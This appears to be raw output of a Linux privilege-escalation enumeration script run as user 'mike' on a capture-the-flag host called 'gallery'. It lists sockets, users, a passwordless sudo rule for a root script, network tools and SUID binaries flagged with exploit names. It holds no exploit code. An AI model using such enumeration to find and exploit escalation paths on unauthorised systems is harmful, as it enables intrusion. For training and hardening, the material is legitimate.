/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket
/lib/systemd/system/syslog.socket is calling this writable listener: /run/systemd/journal/syslog
/lib/systemd/system/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log
/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout
/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket
/lib/systemd/system/uuidd.socket is calling this writable listener: /run/uuidd/request

╔══════════╣ Unix Sockets Listening
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sockets
/run/acpid.socket
  └─(Read Write)
/run/dbus/system_bus_socket
  └─(Read Write)
/run/lvm/lvmetad.socket
/run/lvm/lvmpolld.socket
/run/mysqld/mysqld.sock
  └─(Read Write)
/run/php/php7.2-fpm.sock
/run/systemd/journal/dev-log
  └─(Read Write)
/run/systemd/journal/socket
  └─(Read Write)
/run/systemd/journal/stdout
  └─(Read Write)
/run/systemd/journal/syslog
  └─(Read Write)
/run/systemd/notify
  └─(Read Write)
/run/systemd/private
  └─(Read Write)
/run/udev/control
/run/user/1001/gnupg/S.dirmngr
  └─(Read Write)
/run/user/1001/gnupg/S.gpg-agent
  └─(Read Write)
/run/user/1001/gnupg/S.gpg-agent.browser
  └─(Read Write)
/run/user/1001/gnupg/S.gpg-agent.extra
  └─(Read Write)
/run/user/1001/gnupg/S.gpg-agent.ssh
  └─(Read Write)
/run/user/1001/systemd/notify
  └─(Read Write)
/run/user/1001/systemd/private
  └─(Read Write)
/run/uuidd/request
  └─(Read Write)
/var/lib/amazon/ssm/ipc/health
/var/lib/amazon/ssm/ipc/termination
/var/run/dbus/system_bus_socket
  └─(Read Write)
/var/run/mysqld/mysqld.sock
  └─(Read Write)
/var/spool/postfix/dev/log
  └─(Read Write)

╔══════════╣ D-Bus config files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#d-bus
Possible weak user policy found on /etc/dbus-1/system.d/dnsmasq.conf (        <policy user="dnsmasq">)
Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.thermald.conf (        <policy group="power">)

╔══════════╣ D-Bus Service Objects list
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#d-bus
NAME                                 PID PROCESS         USER             CONNECTION    UNIT                      SESSION    DESCRIPTION        
:1.0                                 645 systemd-network systemd-network  :1.0          systemd-networkd.service  -          -                  
:1.1                                 646 systemd-resolve systemd-resolve  :1.1          systemd-resolved.service  -          -                  
:1.2                                 662 systemd-logind  root             :1.2          systemd-logind.service    -          -                  
:1.268                              5212 busctl          mike             :1.268        session-c1.scope          c1         -                  
:1.3                                   1 systemd         root             :1.3          init.scope                -          -                  
:1.5                                 670 accounts-daemon[0m root             :1.5          accounts-daemon.service   -          -                  
:1.6                                 665 networkd-dispat root             :1.6          networkd-dispatcher.se…ce -          -                  
:1.7                                 678 unattended-upgr root             :1.7          unattended-upgrades.se…ce -          -                  
:1.8                                 792 polkitd         root             :1.8          polkit.service            -          -                  
com.ubuntu.LanguageSelector            - -               -                (activatable) -                         -         
com.ubuntu.SoftwareProperties          - -               -                (activatable) -                         -         
io.netplan.Netplan                     - -               -                (activatable) -                         -         
org.freedesktop.Accounts             670 accounts-daemon[0m root             :1.5          accounts-daemon.service   -          -                  
org.freedesktop.DBus                   1 systemd         root             -             init.scope                -          -                  
org.freedesktop.PolicyKit1           792 polkitd         root             :1.8          polkit.service            -          -                  
org.freedesktop.hostname1              - -               -                (activatable) -                         -         
org.freedesktop.locale1                - -               -                (activatable) -                         -         
org.freedesktop.login1               662 systemd-logind  root             :1.2          systemd-logind.service    -          -                  
org.freedesktop.network1             645 systemd-network systemd-network  :1.0          systemd-networkd.service  -          -                  
org.freedesktop.resolve1             646 systemd-resolve systemd-resolve  :1.1          systemd-resolved.service  -          -                  
org.freedesktop.systemd1               1 systemd         root             :1.3          init.scope                -          -                  
org.freedesktop.thermald               - -               -                (activatable) -                         -         
org.freedesktop.timedate1              - -               -                (activatable) -                         -         


                              ╔═════════════════════╗
══════════════════════════════╣ Network Information ╠══════════════════════════════
                              ╚═════════════════════╝
╔══════════╣ Hostname, hosts and DNS
gallery
127.0.0.1 localhost
127.0.1.1 gallery

::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

nameserver 127.0.0.53
options edns0
search eu-west-1.compute.internal

╔══════════╣ Interfaces
# symbolic names for networks, see networks(5) for more information
link-local 169.254.0.0
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 9001
        inet 10.10.79.223  netmask 255.255.0.0  broadcast 10.10.255.255
        inet6 fe80::5e:1ff:fef8:927  prefixlen 64  scopeid 0x20<link>
        ether 02:5e:01:f8:09:27  txqueuelen 1000  (Ethernet)
        RX packets 263735  bytes 21761786 (21.7 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 239568  bytes 65931107 (65.9 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 1082  bytes 105307 (105.3 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1082  bytes 105307 (105.3 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0


╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::8080                 :::*                    LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   

╔══════════╣ Can I sniff with tcpdump?
No



                               ╔═══════════════════╗
═══════════════════════════════╣ Users Information ╠═══════════════════════════════
                               ╚═══════════════════╝
╔══════════╣ My user
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#users
uid=1001(mike) gid=1001(mike) groups=1001(mike)

╔══════════╣ Do I have PGP keys?
/usr/bin/gpg
netpgpkeys Not Found
netpgp Not Found

╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
Matching Defaults entries for mike on gallery:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User mike may run the following commands on gallery:
    (root) NOPASSWD: /bin/bash /opt/rootkit.sh

╔══════════╣ Checking sudo tokens
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#reusing-sudo-tokens
ptrace protection is enabled (1)

╔══════════╣ Checking Pkexec policy
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#pe-method-2

[Configuration]
AdminIdentities=unix-user:0
[Configuration]
AdminIdentities=unix-group:sudo;unix-group:admin

╔══════════╣ Superusers
root:x:0:0:root:/root:/bin/bash

╔══════════╣ Users with console
mike:x:1001:1001:mike:/home/mike:/bin/bash
root:x:0:0:root:/root:/bin/bash
ubuntu:x:1000:1000:ubuntu:/home/ubuntu:/bin/bash

╔══════════╣ All users & groups
uid=0(root) gid=0(root) groups=0(root)
uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),24(cdrom),30(dip),46(plugdev)
uid=1001(mike) gid=1001(mike) groups=1001(mike)
uid=100(systemd-network) gid=102(systemd-network) groups=102(systemd-network)
uid=101(systemd-resolve) gid=103(systemd-resolve) groups=103(systemd-resolve)
uid=102(syslog) gid=106(syslog) groups=106(syslog),4(adm)
uid=103(messagebus) gid=107(messagebus) groups=107(messagebus)
uid=104(_apt) gid=65534(nogroup) groups=65534(nogroup)
uid=105(lxd) gid=65534(nogroup) groups=65534(nogroup)
uid=106(uuidd) gid=110(uuidd) groups=110(uuidd)
uid=107(dnsmasq) gid=65534(nogroup) groups=65534(nogroup)
uid=108(landscape) gid=112(landscape) groups=112(landscape)
uid=109(pollinate) gid=1(daemon[0m) groups=1(daemon[0m)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=110(postfix) gid=114(postfix) groups=114(postfix)
uid=111(mysql) gid=116(mysql) groups=116(mysql)
uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=1(daemon[0m) gid=1(daemon[0m) groups=1(daemon[0m)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=3(sys) gid=3(sys) groups=3(sys)
uid=41(gnats) gid=41(gnats) groups=41(gnats)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=5(games) gid=60(games) groups=60(games)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
uid=6(man) gid=12(man) groups=12(man)
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)
uid=9(news) gid=9(news) groups=9(news)

╔══════════╣ Login now
 12:28:18 up 51 min,  0 users,  load average: 0.30, 0.07, 0.02
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT

╔══════════╣ Last logons
ubuntu   tty1         Thu May 20 16:33:51 2021 - crash                     (14:04)     0.0.0.0
reboot   system boot  Thu May 20 16:31:20 2021 - Fri May 21 11:26:03 2021  (18:54)     0.0.0.0
ubuntu   tty1         Thu May 20 14:55:46 2021 - crash                     (01:35)     0.0.0.0
reboot   system boot  Thu May 20 14:42:15 2021 - Fri May 21 11:26:03 2021  (20:43)     0.0.0.0
ubuntu   tty1         Thu May 20 14:17:37 2021 - down                      (00:24)     0.0.0.0
reboot   system boot  Thu May 20 14:16:05 2021 - Thu May 20 14:42:04 2021  (00:25)     0.0.0.0
ubuntu   tty1         Thu May 20 14:07:13 2021 - crash                     (00:08)     0.0.0.0
reboot   system boot  Thu May 20 14:06:03 2021 - Thu May 20 14:42:04 2021  (00:36)     0.0.0.0

wtmp begins Thu May 20 14:06:03 2021

╔══════════╣ Last time logon each user
Username         Port     From             Latest
root             tty1                      Sat Feb 12 21:40:14 +0000 2022

╔══════════╣ Do not forget to test 'su' as any other user with shell: without password and with their names as password (I don't do it in FAST mode...)

╔══════════╣ Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!



                             ╔══════════════════════╗
═════════════════════════════╣ Software Information ╠═════════════════════════════
                             ╚══════════════════════╝
╔══════════╣ Useful software
/usr/bin/base64
/usr/bin/curl
/bin/nc
/bin/netcat
/usr/bin/perl
/usr/bin/php
/bin/ping
/usr/bin/python3
/usr/bin/python3.6
/usr/bin/ruby
/usr/bin/socat
/usr/bin/sudo
/usr/bin/wget

╔══════════╣ Installed Compilers
/usr/share/gcc-8

╔══════════╣ MySQL version
mysql  Ver 15.1 Distrib 10.1.48-MariaDB, for debian-linux-gnu (x86_64) using readline 5.2


═╣ MySQL connection using default root/root ........... No
═╣ MySQL connection using root/toor ................... No
═╣ MySQL connection using root/NOPASS ................. No

╔══════════╣ Searching mysql credentials and exec
From '/etc/mysql/mariadb.conf.d/50-server.cnf' Mysql user: user		= mysql
Found readable /etc/mysql/my.cnf
[client-server]
!includedir /etc/mysql/conf.d/
!includedir /etc/mysql/mariadb.conf.d/

╔══════════╣ Analyzing MariaDB Files (limit 70)
-rw-r--r-- 1 root root 869 May  3  2021 /etc/mysql/mariadb.cnf
[client-server]
!includedir /etc/mysql/conf.d/
!includedir /etc/mysql/mariadb.conf.d/

-rw------- 1 root root 277 Aug 25  2021 /etc/mysql/debian.cnf

╔══════════╣ Analyzing Apache-Nginx Files (limit 70)
Apache version: Server version: Apache/2.4.29 (Ubuntu)
Server built:   2022-01-05T14:50:41
httpd Not Found

Nginx version: nginx Not Found

/etc/apache2/mods-available/php7.2.conf-<FilesMatch ".+\.ph(ar|p|tml)$">
/etc/apache2/mods-available/php7.2.conf:    SetHandler application/x-httpd-php
--
/etc/apache2/mods-available/php7.2.conf-<FilesMatch ".+\.phps$">
/etc/apache2/mods-available/php7.2.conf:    SetHandler application/x-httpd-php-source
--
/etc/apache2/mods-enabled/php7.2.conf-<FilesMatch ".+\.ph(ar|p|tml)$">
/etc/apache2/mods-enabled/php7.2.conf:    SetHandler application/x-httpd-php
--
/etc/apache2/mods-enabled/php7.2.conf-<FilesMatch ".+\.phps$">
/etc/apache2/mods-enabled/php7.2.conf:    SetHandler application/x-httpd-php-source
══╣ PHP exec extensions
drwxr-xr-x 2 root root 4096 May 21  2021 /etc/apache2/sites-enabled
drwxr-xr-x 2 root root 4096 May 21  2021 /etc/apache2/sites-enabled
lrwxrwxrwx 1 root root 31 May 21  2021 /etc/apache2/sites-enabled/batflat.conf -> ../sites-available/batflat.conf
<VirtualHost *:8080>
     ServerAdmin admin@example.com
     DocumentRoot /var/www/html/gallery/
     <Directory /var/www/html/gallery>
          Options FollowSymlinks
          AllowOverride All
          Require all granted
     </Directory>
     ErrorLog ${APACHE_LOG_DIR}/error.log
     CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
lrwxrwxrwx 1 root root 35 May 21  2021 /etc/apache2/sites-enabled/000-default.conf -> ../sites-available/000-default.conf
<VirtualHost *:80>
	ServerAdmin webmaster@localhost
	DocumentRoot /var/www/html
	ErrorLog ${APACHE_LOG_DIR}/error.log
	CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>


-rw-r--r-- 1 root root 1332 Jul 16  2019 /etc/apache2/sites-available/000-default.conf
<VirtualHost *:80>
	ServerAdmin webmaster@localhost
	DocumentRoot /var/www/html
	ErrorLog ${APACHE_LOG_DIR}/error.log
	CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
lrwxrwxrwx 1 root root 35 May 21  2021 /etc/apache2/sites-enabled/000-default.conf -> ../sites-available/000-default.conf
<VirtualHost *:80>
	ServerAdmin webmaster@localhost
	DocumentRoot /var/www/html
	ErrorLog ${APACHE_LOG_DIR}/error.log
	CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>

-rw-r--r-- 1 root root 71817 Oct  7  2020 /etc/php/7.2/apache2/php.ini
allow_url_fopen = On
allow_url_include = Off
odbc.allow_persistent = On
ibase.allow_persistent = 1
mysqli.allow_persistent = On
pgsql.allow_persistent = On
-rw-r--r-- 1 root root 71429 Oct  7  2020 /etc/php/7.2/cli/php.ini
allow_url_fopen = On
allow_url_include = Off
odbc.allow_persistent = On
ibase.allow_persistent = 1
mysqli.allow_persistent = On
pgsql.allow_persistent = On
-rw-r--r-- 1 root root 71817 Oct  7  2020 /etc/php/7.2/fpm/php.ini
allow_url_fopen = On
allow_url_include = Off
odbc.allow_persistent = On
ibase.allow_persistent = 1
mysqli.allow_persistent = On
pgsql.allow_persistent = On


drwxr-xr-x 2 www-data www-data 4096 Jul 16  2021 /var/www/html/gallery/plugins/codemirror/mode/nginx


╔══════════╣ Analyzing Rsync Files (limit 70)
-rw-r--r-- 1 root root 1044 Jul 14  2020 /usr/share/doc/rsync/examples/rsyncd.conf
[ftp]
	comment = public archive
	path = /var/www/pub
	use chroot = yes
	lock file = /var/lock/rsyncd
	read only = yes
	list = yes
	uid = nobody
	gid = nogroup
	strict modes = yes
	ignore errors = no
	ignore nonreadable = yes
	transfer logging = no
	timeout = 600
	refuse options = checksum dry-run
	dont compress = *.gz *.tgz *.zip *.z *.rpm *.deb *.iso *.bz2 *.tbz


╔══════════╣ Analyzing Ldap Files (limit 70)
The password hash is from the {SSHA} to 'structural'
drwxr-xr-x 2 root root 4096 May 20  2021 /etc/ldap


╔══════════╣ Searching ssl/ssh files
══╣ Some certificates were found (out limited):
/etc/pollinate/entropy.ubuntu.com.pem
/etc/ssl/certs/ACCVRAIZ1.pem
/etc/ssl/certs/AC_RAIZ_FNMT-RCM.pem
/etc/ssl/certs/Actalis_Authentication_Root_CA.pem
/etc/ssl/certs/AffirmTrust_Commercial.pem
/etc/ssl/certs/AffirmTrust_Networking.pem
/etc/ssl/certs/AffirmTrust_Premium_ECC.pem
/etc/ssl/certs/AffirmTrust_Premium.pem
/etc/ssl/certs/Amazon_Root_CA_1.pem
/etc/ssl/certs/Amazon_Root_CA_2.pem
/etc/ssl/certs/Amazon_Root_CA_3.pem
/etc/ssl/certs/Amazon_Root_CA_4.pem
/etc/ssl/certs/Atos_TrustedRoot_2011.pem
/etc/ssl/certs/Autoridad_de_Certificacion_Firmaprofesional_CIF_A62634068.pem
/etc/ssl/certs/Baltimore_CyberTrust_Root.pem
/etc/ssl/certs/Buypass_Class_2_Root_CA.pem
/etc/ssl/certs/Buypass_Class_3_Root_CA.pem
/etc/ssl/certs/ca-certificates.crt
/etc/ssl/certs/CA_Disig_Root_R2.pem
/etc/ssl/certs/Certigna.pem
30718PSTORAGE_CERTSBIN

══╣ /etc/hosts.allow file found, trying to read the rules:
/etc/hosts.allow


Searching inside /etc/ssh/ssh_config for interesting info
Host *
    SendEnv LANG LC_*
    HashKnownHosts yes
    GSSAPIAuthentication yes

╔══════════╣ Analyzing PAM Auth Files (limit 70)
drwxr-xr-x 2 root root 4096 Feb 12  2022 /etc/pam.d




╔══════════╣ Searching tmux sessions
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-shell-sessions
tmux 2.6


/tmp/tmux-33
/tmp/tmux-1001
╔══════════╣ Analyzing Cloud Init Files (limit 70)
-rw-r--r-- 1 root root 3747 Nov  3  2021 /etc/cloud/cloud.cfg
     lock_passwd: True

╔══════════╣ Analyzing Keyring Files (limit 70)
drwxr-xr-x 2 root root 4096 Feb 12  2022 /usr/share/keyrings




╔══════════╣ Searching uncommon passwd files (splunk)
passwd file: /etc/pam.d/passwd
passwd file: /etc/passwd
passwd file: /usr/share/bash-completion/completions/passwd
passwd file: /usr/share/lintian/overrides/passwd
passwd file: /var/lib/rkhunter/tmp/passwd

╔══════════╣ Analyzing PGP-GPG Files (limit 70)
/usr/bin/gpg
netpgpkeys Not Found
netpgp Not Found

-rw-r--r-- 1 root root 2796 Mar 29  2021 /etc/apt/trusted.gpg.d/ubuntu-keyring-2012-archive.gpg
-rw-r--r-- 1 root root 2794 Mar 29  2021 /etc/apt/trusted.gpg.d/ubuntu-keyring-2012-cdimage.gpg
-rw-r--r-- 1 root root 1733 Mar 29  2021 /etc/apt/trusted.gpg.d/ubuntu-keyring-2018-archive.gpg
-rw-r--r-- 1 root root 3267 Jan 16  2021 /usr/share/gnupg/distsigkey.gpg
-rw-r--r-- 1 root root 2247 Jan 20  2022 /usr/share/keyrings/ubuntu-advantage-cc-eal.gpg
-rw-r--r-- 1 root root 2274 Jan 20  2022 /usr/share/keyrings/ubuntu-advantage-cis.gpg
-rw-r--r-- 1 root root 2236 Jan 20  2022 /usr/share/keyrings/ubuntu-advantage-esm-apps.gpg
-rw-r--r-- 1 root root 2264 Jan 20  2022 /usr/share/keyrings/ubuntu-advantage-esm-infra-trusty.gpg
-rw-r--r-- 1 root root 2275 Jan 20  2022 /usr/share/keyrings/ubuntu-advantage-fips.gpg
-rw-r--r-- 1 root root 2235 Jan 20  2022 /usr/share/keyrings/ubuntu-advantage-ros.gpg
-rw-r--r-- 1 root root 7399 Sep 17  2018 /usr/share/keyrings/ubuntu-archive-keyring.gpg
-rw-r--r-- 1 root root 6713 Oct 27  2016 /usr/share/keyrings/ubuntu-archive-removed-keys.gpg
-rw-r--r-- 1 root root 4097 Feb  6  2018 /usr/share/keyrings/ubuntu-cloudimage-keyring.gpg
-rw-r--r-- 1 root root 0 Jan 17  2018 /usr/share/keyrings/ubuntu-cloudimage-removed-keys.gpg
-rw-r--r-- 1 root root 1227 May 27  2010 /usr/share/keyrings/ubuntu-master-keyring.gpg
-rw-r--r-- 1 root root 2867 Feb 22  2018 /usr/share/popularity-contest/debian-popcon.gpg

drwx------ 3 mike mike 4096 Aug 20 12:28 /home/mike/.gnupg
drwxr-xr-x 3 root root 4096 May 24  2021 /var/backups/mike_home_backup/.gnupg


╔══════════╣ Analyzing Postfix Files (limit 70)
-rwxr-xr-x 1 root root 3624 Oct 11  2018 /etc/init.d/postfix

-rw-r--r-- 1 root root 30 Jul 10  2020 /etc/insserv.conf.d/postfix

-rwxr-xr-x 1 root root 800 Jul 10  2020 /etc/network/if-down.d/postfix

-rwxr-xr-x 1 root root 1117 Jul 10  2020 /etc/network/if-up.d/postfix

drwxr-xr-x 5 root root 4096 Aug 25  2021 /etc/postfix
-rw-r--r-- 1 root root 6143 May 20  2021 /etc/postfix/master.cf
  flags=DRhu user=vmail argv=/usr/bin/maildrop -d ${recipient}
#  user=cyrus argv=/cyrus/bin/deliver -e -r ${sender} -m ${extension} ${user}
#  flags=R user=cyrus argv=/cyrus/bin/deliver -e -m ${extension} ${user}
  flags=Fqhu user=uucp argv=uux -r -n -z -a$sender - $nexthop!rmail ($recipient)
  flags=F user=ftn argv=/usr/lib/ifmail/ifmail -r $nexthop ($recipient)
  flags=Fq. user=bsmtp argv=/usr/lib/bsmtp/bsmtp -t$nexthop -f$sender $recipient
  flags=R user=scalemail argv=/usr/lib/scalemail/bin/scalemail-store ${nexthop} ${user} ${extension}
  flags=FR user=list argv=/usr/lib/mailman/bin/postfix-to-mailman.py

-rwxr-xr-x 1 root root 800 Jul 10  2020 /etc/ppp/ip-down.d/postfix

-rwxr-xr-x 1 root root 1117 Jul 10  2020 /etc/ppp/ip-up.d/postfix

-rwxr-xr-x 1 root root 439 Jul 10  2020 /etc/resolvconf/update-libc.d/postfix

-rw-r--r-- 1 root root 361 Jul 10  2020 /etc/ufw/applications.d/postfix

drwxr-xr-x 3 root root 4096 Aug 25  2021 /usr/lib/postfix

-rwxr-xr-x 1 root root 14408 Aug 12  2021 /usr/sbin/postfix

-rw-r--r-- 1 root root 675 Apr  2  2018 /usr/share/bash-completion/completions/postfix

drwxr-xr-x 2 root root 4096 Aug 25  2021 /usr/share/doc/postfix

-rw-r--r-- 1 root root 166 Aug 12  2021 /usr/share/lintian/overrides/postfix

drwxr-xr-x 2 root root 4096 Aug 25  2021 /usr/share/postfix

drwxr-xr-x 2 postfix postfix 4096 Jul 10  2020 /var/lib/postfix

drwxr-xr-x 18 root root 4096 Aug 25  2021 /var/spool/postfix


╔══════════╣ Analyzing FTP Files (limit 70)



-rw-r--r-- 1 root root 69 Oct  7  2020 /etc/php/7.2/mods-available/ftp.ini
-rw-r--r-- 1 root root 69 Oct 25  2021 /usr/share/php7.2-common/common/ftp.ini






╔══════════╣ Analyzing DNS Files (limit 70)
-rw-r--r-- 1 root root 856 Apr  2  2018 /usr/share/bash-completion/completions/bind
-rw-r--r-- 1 root root 856 Apr  2  2018 /usr/share/bash-completion/completions/bind




╔══════════╣ Analyzing Windows Files (limit 70)






















lrwxrwxrwx 1 root root 22 Aug 25  2021 /etc/alternatives/my.cnf -> /etc/mysql/mariadb.cnf
lrwxrwxrwx 1 root root 24 Aug 25  2021 /etc/mysql/my.cnf -> /etc/alternatives/my.cnf
-rw-r--r-- 1 root root 83 Aug 25  2021 /var/lib/dpkg/alternatives/my.cnf





























╔══════════╣ Analyzing Other Interesting Files (limit 70)
-rw-r--r-- 1 root root 3771 Apr  4  2018 /etc/skel/.bashrc
-rw-r--r-- 1 mike mike 3772 May 20  2021 /home/mike/.bashrc
-rwxr-xr-x 1 root root 3772 May 24  2021 /var/backups/mike_home_backup/.bashrc





-rw-r--r-- 1 root root 807 Apr  4  2018 /etc/skel/.profile
-rw-r--r-- 1 mike mike 807 Apr  4  2018 /home/mike/.profile
-rwxr-xr-x 1 root root 807 May 24  2021 /var/backups/mike_home_backup/.profile






                      ╔════════════════════════════════════╗
══════════════════════╣ Files with Interesting Permissions ╠══════════════════════
                      ╚════════════════════════════════════╝
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
-rwsr-xr-x 1 root root 63K Jun 28  2019 /bin/ping
-rwsr-xr-x 1 root root 43K Sep 16  2020 /bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 27K Sep 16  2020 /bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 31K Aug 11  2016 /bin/fusermount
-rwsr-xr-x 1 root root 44K Jan 25  2022 /bin/su
-rwsr-xr-x 1 root root 146K Jan 19  2021 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root root 59K Jan 25  2022 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 44K Jan 25  2022 /usr/bin/chsh
-rwsr-xr-x 1 root root 40K Jan 25  2022 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 19K Jun 28  2019 /usr/bin/traceroute6.iputils
-rwsr-xr-x 1 root root 75K Jan 25  2022 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-sr-x 1 daemon daemon 51K Feb 20  2018 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
-rwsr-xr-x 1 root root 75K Jan 25  2022 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 427K Aug 11  2021 /usr/lib/openssh/ssh-keysign
-rwsr-xr-- 1 root messagebus 42K Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 14K Jan 12  2022 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root root 10K Mar 28  2017 /usr/lib/eject/dmcrypt-get-device

╔══════════╣ SGID
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
-rwxr-sr-x 1 root shadow 34K Apr  8  2021 /sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root shadow 34K Apr  8  2021 /sbin/unix_chkpwd
-rwxr-sr-x 1 root ssh 355K Aug 11  2021 /usr/bin/ssh-agent
-rwxr-sr-x 1 root tty 31K Sep 16  2020 /usr/bin/wall
-rwxr-sr-x 1 root shadow 71K Jan 25  2022 /usr/bin/chage
-rwxr-sr-x 1 root tty 14K Jan 17  2018 /usr/bin/bsd-write
-rwxr-sr-x 1 root crontab 39K Nov 16  2017 /usr/bin/crontab
-rwsr-sr-x 1 daemon daemon 51K Feb 20  2018 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
-rwxr-sr-x 1 root shadow 23K Jan 25  2022 /usr/bin/expiry
-rwxr-sr-x 1 root mail 18K Dec  3  2017 /usr/bin/dotlockfile
-rwxr-sr-x 1 root mlocate 43K Mar  1  2018 /usr/bin/mlocate
-rwxr-sr-x 1 root utmp 10K Mar 11  2016 /usr/lib/x86_64-linux-gnu/utempter/utempter
-r-xr-sr-x 1 root postdrop 15K Aug 12  2021 /usr/sbin/postdrop
-r-xr-sr-x 1 root postdrop 23K Aug 12  2021 /usr/sbin/postqueue

╔══════════╣ Checking misconfigurations of ld.so
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#ld.so
/etc/ld.so.conf
Content of /etc/ld.so.conf:
include /etc/ld.so.conf.d/*.conf

/etc/ld.so.conf.d
  /etc/ld.so.conf.d/libc.conf
  - /usr/local/lib
  /etc/ld.so.conf.d/x86_64-linux-gnu.conf
  - /usr/local/lib/x86_64-linux-gnu
  - /lib/x86_64-linux-gnu
  - /usr/lib/x86_64-linux-gnu

/etc/ld.so.preload
╔══════════╣ Capabilities
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities
══╣ Current shell capabilities
CapInh:  0x0000000000000000=
CapPrm:  0x0000000000000000=
CapEff:	 0x0000000000000000=
CapBnd:  0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
CapAmb:  0x0000000000000000=

══╣ Parent process capabilities
CapInh:	 0x0000000000000000=
CapPrm:	 0x0000000000000000=
CapEff:	 0x0000000000000000=
CapBnd:	 0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
CapAmb:	 0x0000000000000000=


Files with capabilities (limited to 50):
/usr/bin/mtr-packet = cap_net_raw+ep

╔══════════╣ Users with capabilities
